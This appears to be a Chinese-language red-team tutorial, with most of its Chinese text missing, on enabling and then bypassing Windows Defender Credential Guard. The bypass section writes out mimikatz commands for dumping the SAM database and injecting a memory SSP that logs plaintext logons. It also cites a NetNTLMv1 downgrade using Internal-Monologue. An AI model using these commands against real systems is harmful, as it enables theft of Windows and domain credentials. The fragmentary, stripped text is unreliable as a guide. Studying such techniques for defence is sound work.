Bypass Credential Guard
0x01 Credential Guard
1
Windows Defender Credential Guard (WDCG) Windows 10
WDCG  LSASS  (LSAISO) ,
 (trusted) 
administrator / System  LSASS/LSAISO 
WDCG  NTLM Kerberos (Kerberos derived credentials) 
(domain credentials)
 Credential Guard lsass 2LSALSAVSM
2 Gredential Guard
 Microsoft  Powershell 
TPM -1.2 2.0 
UEFI  - 
64  CPU
CPU 
Windows  Hyper-v Windows 
gpedit.msc) 
 Windows Defender 
 "" -> “” -> “” -> “Device Guard” "" 
"";
  ""  "DMA"
 "UEFI" Credential Guard
""
Windows System  ID 1415 
  LSA  LsaIso.exe
 mimikatz 
gpupdate /force
1
 Gredential Guard
0x02 Bypass Credential Guard
1Dump SAM
 CG (  Credential Guard )  SAM  CG
2SSP
 SSP  lsass.exe  Microsoft 
Mimikatz ssplsasslsass
 c:\windows\system32\  mimilsa.log
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
1
2
3
mimikatz # privilege::debug
mimikatz # misc::memssp
1
2
3NetNTLM Downgrade Attack
NetNTLM NetNTLMv1NetNTLMv2v1  v2 
 Windows NetNTLMv1 NTLM SSP 
 NetNTLMv1 
 & 
Usage
0x03 
https://docs.microsoft.com/zh-cn/windows/security/identity-protection/credential-guard/credenti
al-guard-requirements
https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credenti
al-guard-manage
https://docs.microsoft.com/zh-cn/windows/security/identity-protection/remote-credential-guard
https://blog.stealthbits.com/defender-credential-guard-protecting-your-hashes/
https://www.microsoft.com/en-us/download/details.aspx?id=53337
https://github.com/eladshamir/Internal-Monologue
1
Internal-Monologue.exe
1